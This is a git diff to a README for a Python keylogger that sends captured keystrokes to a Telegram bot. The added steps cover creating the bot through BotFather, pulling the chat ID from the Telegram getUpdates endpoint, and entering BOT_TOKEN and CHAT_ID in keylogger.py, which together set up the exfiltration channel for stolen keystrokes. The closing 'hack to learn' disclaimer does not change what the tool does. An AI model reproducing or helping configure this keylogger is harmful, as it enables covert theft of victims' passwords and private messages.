@@ -41,7 +41,7 @@ Follow these exact steps to create your Telegram bot and connect it with the key
 - Open the Telegram app.
 - Search for @BotFather and start a chat.
 - Send the command:
-  /newbot
+  ```/newbot```
 - BotFather will ask you for:
     - A name → any name you want (e.g., KeyLogger Bot)
     - A username → must end in bot (e.g., loggerx_bot)
@@ -52,12 +52,47 @@ Follow these exact steps to create your Telegram bot and connect it with the key
 
   ---
 
-  ## Step 2: Start Your Bot
+## Step 2: Start Your Bot
 
 - In Telegram, search for your newly created bot (@loggerx_bot).
 - Click Start or type any message like Hello.
 
 This is necessary so Telegram can register your chat for updates.
 
+---
 
+##  Step 3: Get Your Chat ID
 
+- Open your browser and go to:
+  ```
+  https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
+  ```
+  Replace <YOUR_BOT_TOKEN> with the actual token from BotFather.
+- In the response, find a block like:
+  ```json
+  "chat": {
+  "id": 200535565,
+  ...
+  }
+  ```
+-  Copy the number inside id → this is your CHAT_ID
+
+---
+
+# How to Use
+
+Edit the following lines in your keylogger.py file:
+
+```python
+BOT_TOKEN = 'your-telegram-bot-token'
+CHAT_ID = 'your-chat-id'
+```
+
+---
+
+# Respect the Hacker Ethic
+> Hack to learn.
+> Never hack to harm.
+> Always ask permission before testing others' systems.
+
+  
